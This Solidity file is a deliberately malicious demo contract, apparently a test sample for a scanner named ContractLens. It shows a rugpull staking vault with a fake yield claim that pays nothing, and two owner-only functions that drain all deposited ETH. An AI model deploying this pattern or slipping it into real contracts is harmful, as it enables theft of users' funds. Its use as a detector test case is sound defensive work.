// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// DEMO: Classic rugpull liquidity pool / staking vault.
// Users deposit ETH expecting yield. Owner can drain the entire pool at any time.
// ContractLens should flag: unrestricted owner withdraw, no timelock, no cap.

contract RugpullVault {
    address public owner;
    mapping(address => uint256) public deposits;
    uint256 public totalDeposited;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event YieldPaid(address indexed user, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        require(msg.value > 0, "zero");
        deposits[msg.sender] += msg.value;
        totalDeposited += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // Looks legit to a casual reader
    function claimYield() external {
        uint256 yieldAmt = (deposits[msg.sender] * 12) / 100;
        emit YieldPaid(msg.sender, yieldAmt);
        // ...but no actual payout logic
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "balance");
        deposits[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdraw(msg.sender, amount);
    }

    // THE RUG: owner pulls everything, no checks, no timelock
    function emergencyMigrate(address payable newPool) external {
        require(msg.sender == owner, "only owner");
        newPool.transfer(address(this).balance);
    }

    // Hidden second escape hatch
    function sweep() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }

    function transferOwnership(address newOwner) external {
        require(msg.sender == owner, "only owner");
        owner = newOwner;
    }
}
